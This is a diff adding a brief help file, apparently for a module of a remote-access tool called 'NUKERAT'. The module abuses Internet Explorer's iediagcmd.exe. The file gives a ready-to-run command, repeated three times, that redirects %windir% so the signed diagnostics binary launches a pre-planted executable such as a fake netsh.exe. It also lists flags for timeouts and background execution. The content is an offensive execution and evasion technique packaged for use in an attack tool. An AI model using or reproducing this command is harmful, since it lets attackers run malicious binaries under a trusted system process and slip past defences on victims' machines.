@@ -1,0 +1,17 @@
+ABOUT
+    Internet Explorer diagnostics collector. LOLBAS abuses a
+    redirected %windir% to launch a pre-planted binary such as netsh.exe
+    during CAB output generation.
+
+USAGE:
+    set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
+
+EXAMPLES:
+    set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
